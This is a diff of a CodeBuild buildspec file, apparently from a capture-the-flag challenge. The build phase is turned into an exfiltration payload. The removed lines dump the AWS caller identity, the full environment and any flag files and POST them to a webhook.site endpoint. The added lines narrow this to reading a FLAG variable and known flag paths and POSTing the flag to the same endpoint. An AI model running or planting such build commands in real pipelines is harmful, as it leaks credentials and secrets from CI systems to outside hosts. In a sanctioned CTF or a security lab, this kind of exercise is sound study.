@@ -3,33 +3,27 @@ version: 0.2
 phases:
   build:
     commands:
-      - echo "=== WHO AM I ==="
-      - aws sts get-caller-identity
+      - echo "=== ENV FLAG ==="
+      - printenv | grep -iE '^FLAG=|_FLAG=|FLAG_' || true
 
-      - echo "=== CURRENT DIRECTORY ==="
-      - pwd
-      - ls -la
-
-      - echo "=== ENVIRONMENT VARIABLES ==="
-      - env | sort
-
-      - echo "=== POSSIBLE FLAG ENV VARS ==="
-      - env | grep -Ei 'flag|secret|token|key' || true
-
-      - echo "=== SEARCH FOR FLAG FILES ==="
-      - find / -type f \( -iname "flag.txt" -o -iname "*flag*" \) -readable 2>/dev/null | head -100
-
-      - echo "=== EXFILTRATE ENV ==="
-      - curl -sS -X POST "https://webhook.site/29a212a0-5a5f-442e-ac6f-85ba10c4565b" --data-urlencode "identity=$(aws sts get-caller-identity)"
-      - curl -sS -X POST "https://webhook.site/29a212a0-5a5f-442e-ac6f-85ba10c4565b" --data-urlencode "env=$(env)"
-
-      - echo "=== EXFILTRATE FLAG FILES ==="
+      - echo "=== FLAG FILE ==="
       - |
-        find / -type f \( -iname "flag.txt" -o -iname "*flag*" \) -readable 2>/dev/null |
-        while read -r file; do
-          echo "Found: $file"
+        for f in /flag /flag.txt /tmp/flag /tmp/flag.txt /root/flag /root/flag.txt \
+                 /workspace/flag /workspace/flag.txt; do
+          if [ -f "$f" ]; then
+            echo "FOUND $f"
+            cat "$f"
+          fi
+        done
+
+      - echo "=== TARGETED SEARCH ==="
+      - grep -RniE 'flag\{[^}]+\}|HTB\{|HTB-' /tmp /workspace /root 2>/dev/null | head -20 || true
+
+      - echo "=== EXFILTRATE ==="
+      - |
+        FLAG="$(printenv | grep -iE '^FLAG=' | head -1 | cut -d= -f2-)"
+        if [ -n "$FLAG" ]; then
           curl -sS -X POST \
             "https://webhook.site/29a212a0-5a5f-442e-ac6f-85ba10c4565b" \
-            --data-urlencode "path=$file" \
-            --data-urlencode "content=$(cat "$file")"
-        done
+            --data-urlencode "flag=$FLAG"
+        fi
